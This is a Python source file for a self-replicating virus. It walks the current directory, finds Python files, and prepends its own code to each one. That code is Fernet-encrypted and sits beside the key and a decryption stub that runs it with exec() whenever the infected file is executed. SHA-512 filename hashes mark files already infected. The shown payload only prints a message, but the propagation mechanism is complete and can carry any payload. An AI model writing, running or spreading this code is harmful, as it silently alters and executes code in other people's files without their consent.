#567b6ae9d170de8634ee87677e1e024a453ae7b9a77464811e2d17068d3c19754165551c82a9ecfca0bbf557a7971056d8cd4496bd5f7a18ffc002604c302e9d
import os
import hashlib
from cryptography.fernet import Fernet

def select_target():
    list_of_files=[]
    for root,dirs,files in os.walk("."):
        for file in files:
            if ".py" in file:
                list_of_files.append(root+"/"+file)
    return list_of_files

def copy_code(file,infected_code,decryption_code):
    key=Fernet.generate_key()
    aes=Fernet(key)
    encrypted_code=aes.encrypt(infected_code.encode())
    hash=hashlib.sha512(file[file.rindex("/")+1:].encode()).hexdigest()
    with open(file,"r",encoding="unicode_escape") as fp:
        tmp=fp.read()
    if hash not in tmp:
        with open(file,"w") as fp:
            fp.write("#"+hash+"\n"+"#key-"+key.decode()+"\n#"+encrypted_code.decode()+"\n#"+hash+"\n"+decryption_code+"\n#"+hash+"\n"+tmp)

def payload():
    print("Infection code")

def get_infected_code(file):
    with open(__file__,"r") as fp:
        infected_code=fp.readlines()
    if "#key-" in infected_code:
        key=infected_code[1][1:].encode()
        code=infected_code[2][1:].encode()
        aes=Fernet(key)
        decrypted_code=aes.decrypt(code)
        infected_code=decrypted_code
    hash="#"+hashlib.sha512(__file__[__file__.rindex("/")+1:].encode()).hexdigest()
    for index,line in enumerate(infected_code):
        if hash in line:
            li=index
            break
    for index,line in enumerate(infected_code[li+1:]):
        if hash in line:
            ri=li+index+1
            break
    ic="".join(infected_code[li+1:ri])
    for index,line in enumerate(infected_code[ri+1:]):
        if hash in line:
            dri=ri+index+1
            break
    dc="".join(infected_code[ri+1:dri])
    return (ic,dc)

def infect():
    ic,dc=get_infected_code(__file__)
    for file in select_target():
        copy_code(file,ic,dc)
    payload()
infect()
#567b6ae9d170de8634ee87677e1e024a453ae7b9a77464811e2d17068d3c19754165551c82a9ecfca0bbf557a7971056d8cd4496bd5f7a18ffc002604c302e9d
from cryptography.fernet import Fernet
import hashlib
try:
    with open(__file__,"r") as fp:
        code=fp.readlines()
    hash="#"+hashlib.sha512(__file__[__file__.rindex("/")+1:].encode()).hexdigest()
    key=code[1][5:].encode()
    exec_code=code[2][1:].encode()
    aes=Fernet(key)
    decrypt=aes.decrypt(exec_code)
    exec(decrypt)
except:
    print("Something Went Wrong!!!")
#567b6ae9d170de8634ee87677e1e024a453ae7b9a77464811e2d17068d3c19754165551c82a9ecfca0bbf557a7971056d8cd4496bd5f7a18ffc002604c302e9d
